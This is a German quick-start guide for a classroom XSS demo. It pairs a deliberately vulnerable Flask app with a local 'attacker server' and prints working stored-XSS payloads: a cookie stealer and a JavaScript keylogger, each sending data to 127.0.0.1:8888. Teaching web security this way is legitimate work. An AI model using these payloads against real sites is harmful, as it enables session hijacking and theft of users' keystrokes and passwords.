# 🚀 Quick Start - XSS Demo Setup

## ⚠️ Wichtig: Zwei-Server-Setup

Für diese Demo benötigst du **ZWEI separate Server**:

1. **Verwundbare Webanwendung** (Port 5001) - `app.py`
2. **Attacker-Server** (Port 8888) - `attacker_server.py`

---

## 📋 Voraussetzungen

```bash
# Flask und Flask-CORS installieren
pip install flask flask-cors

# MySQL muss laufen und die Datenbank 'hackingdb' muss existieren
```

---

## 🎯 Setup in 3 Schritten

### Schritt 1: Attacker-Server starten

Öffne ein **ERSTES Terminal** und starte den Attacker-Server:

```bash
python attacker_server.py
```

Du solltest diesen Banner sehen:

```
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║           🎯 ATTACKER SERVER GESTARTET 🎯               ║
║                                                          ║
║  Port: 8888                                              ║
║  Endpoints:                                              ║
║    • /steal_cookie  (GET/POST)                           ║
║    • /log_keys      (POST)                               ║
║                                                          ║
║  ⚠️  NUR FÜR BILDUNGSZWECKE                              ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

**Lass dieses Terminal offen und laufen!**

---

### Schritt 2: Verwundbare App starten

Öffne ein **ZWEITES Terminal** und starte die verwundbare Anwendung:

```bash
python app.py
```

Die App läuft jetzt auf: `http://127.0.0.1:5001`

**Lass auch dieses Terminal offen und laufen!**

---

### Schritt 3: Angriff durchführen

#### Demo 1: Cookie-Diebstahl 🍪

1. Öffne Browser: `http://127.0.0.1:5001`
2. Registriere einen User oder logge dich ein
3. Gehe zu `/posts` oder `/edit_bio/<user_id>`
4. Füge diesen Payload ein:

```html
<script>fetch('http://127.0.0.1:8888/steal_cookie?c='+document.cookie)</script>
```

5. Speichere den Post/Bio
6. Öffne die Seite in einem **anderen Browser/Tab** (simuliert Opfer)
7. Logge dich als anderer User ein
8. Besuche die Seite mit dem Payload

**Ergebnis:**
Im **Attacker-Server Terminal** siehst du:

```
====================================================================
🍪 COOKIE GESTOHLEN!
--------------------------------------------------------------------
Zeitpunkt:   2025-12-02 15:30:45
Opfer IP:    127.0.0.1
User-Agent:  Mozilla/5.0 ...
Cookie:      session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6InRlc3QifX0...
====================================================================
```

Außerdem wird der Cookie in `stolen_cookies.txt` gespeichert.

---

#### Demo 2: Keylogger ⌨️

1. Gehe zu `/posts` oder `/edit_bio/<user_id>`
2. Füge diesen Payload ein:

```html
<script>let buffer='';document.addEventListener('keypress',function(e){buffer+=e.key;});setInterval(function(){if(buffer.length>0){fetch('http://127.0.0.1:8888/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+encodeURIComponent(buffer)});buffer='';}},3000);</script>
```

3. Speichere den Post/Bio
4. Öffne die Seite in einem anderen Browser/Tab
5. Tippe irgendwo auf der Seite (z.B. in Suchfelder)
6. Warte 3 Sekunden

**Ergebnis:**
Im **Attacker-Server Terminal** siehst du:

```
⌨️  KEYLOG [15:32:10] [127.0.0.1]: password123
⌨️  KEYLOG [15:32:13] [127.0.0.1]: secret message
```

Die Daten werden auch in `keylog.txt` gespeichert.

---

## 📊 Monitoring

### Terminal 1: Attacker-Server
Zeigt **live** alle gestohlenen Daten:
- Cookie-Diebstahl mit IP, User-Agent, Referer
- Keylogger-Daten mit Timestamp

### Terminal 2: Verwundbare App
Zeigt normale Flask-Logs (Requests, Errors, etc.)

### Dateien
- `stolen_cookies.txt` - Alle gestohlenen Cookies mit Timestamp
- `keylog.txt` - Alle Keylogger-Daten mit Timestamp

### Browser DevTools
- **Network Tab**: Sieh Requests zu Port 8888
- **Console Tab**: JavaScript-Fehler debuggen

---

## 🎨 Server-Ports Übersicht

| Server | Port | URL | Zweck |
|--------|------|-----|-------|
| **Verwundbare App** | 5001 | http://127.0.0.1:5001 | Die XSS-anfällige Webanwendung |
| **Attacker-Server** | 8888 | http://127.0.0.1:8888 | Empfängt gestohlene Daten |

---

## 🔍 Troubleshooting

### Problem: "Connection refused" beim Payload

**Ursache:** Attacker-Server läuft nicht

**Lösung:**
```bash
# Prüfe ob Port 8888 läuft
lsof -i :8888

# Wenn nicht, starte attacker_server.py
python attacker_server.py
```

---

### Problem: Keine Cookies werden gestohlen

**Check 1:** Ist `SESSION_COOKIE_HTTPONLY = False` in `app.py` Zeile 12?

**Check 2:** Browser DevTools → Console → tippe:
```javascript
document.cookie
```
Siehst du den Cookie?

**Check 3:** Browser DevTools → Network Tab → siehst du Request zu `127.0.0.1:8888/steal_cookie`?

---

### Problem: Keylogger funktioniert nicht

**Check 1:** Browser DevTools → Network Tab → siehst du POST zu `127.0.0.1:8888/log_keys`?

**Check 2:** Browser Console → tippe zum Testen:
```javascript
fetch('http://127.0.0.1:8888/log_keys', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'keys=test'
})
```

**Check 3:** CORS-Fehler? Der Attacker-Server hat CORS aktiviert, sollte also funktionieren.

---

### Problem: "Address already in use"

**Ursache:** Port ist bereits belegt

**Lösung:**
```bash
# Port 8888 freigeben (macOS/Linux)
lsof -ti:8888 | xargs kill -9

# Port 5001 freigeben
lsof -ti:5001 | xargs kill -9

# Dann Server neu starten
```

---

## 📚 Datei-Übersicht

| Datei | Beschreibung |
|-------|--------------|
| `attacker_server.py` | **Separater Attacker-Server** (Port 8888) |
| `app.py` | Verwundbare Webanwendung (Port 5001) |
| `payload_cookie_stealer.js` | Cookie-Diebstahl Payloads |
| `payload_keylogger.js` | Keylogger Payloads |
| `XSS_DEMO_ANLEITUNG.md` | Ausführliche technische Dokumentation |
| `START_ANLEITUNG.md` | Diese Quick-Start Anleitung |

---

## ✅ Checkliste vor der Demo

- [ ] Python und pip installiert
- [ ] `pip install flask flask-cors` ausgeführt
- [ ] MySQL läuft
- [ ] Datenbank `hackingdb` existiert
- [ ] 2-3 Test-User angelegt
- [ ] **Terminal 1**: `python attacker_server.py` läuft
- [ ] **Terminal 2**: `python app.py` läuft
- [ ] Browser DevTools geöffnet
- [ ] Alte `stolen_cookies.txt` und `keylog.txt` gelöscht (optional)

---

## 🎓 Für die Präsentation

### Zeige beide Terminals nebeneinander:
```
┌──────────────────────┬──────────────────────┐
│  Terminal 1          │  Terminal 2          │
│  Attacker-Server     │  Verwundbare App     │
│  (Port 8888)         │  (Port 5001)         │
├──────────────────────┼──────────────────────┤
│ 🍪 COOKIE GESTOHLEN! │ * Running on         │
│ Opfer IP: 127.0.0.1  │   http://0.0.0.0:5001│
│ Cookie: session=...  │ 127.0.0.1 - - [02... │
│                      │ "POST /posts HTTP/1. │
│ ⌨️ KEYLOG: password │                      │
└──────────────────────┴──────────────────────┘
```

### Demo-Reihenfolge:
1. Zeige beide Server laufen
2. Registriere User "attacker" und "victim"
3. Als "attacker": Füge Cookie-Stealer in Post ein
4. Als "victim" (anderer Browser): Besuche Posts
5. **Zeige Live im Attacker-Terminal**: Cookie wurde gestohlen
6. Als "attacker": Füge Keylogger in Bio ein
7. Als "victim": Besuche Users-Seite und tippe etwas
8. **Zeige Live im Attacker-Terminal**: Keylogger-Daten

---

**Viel Erfolg! 🎯**
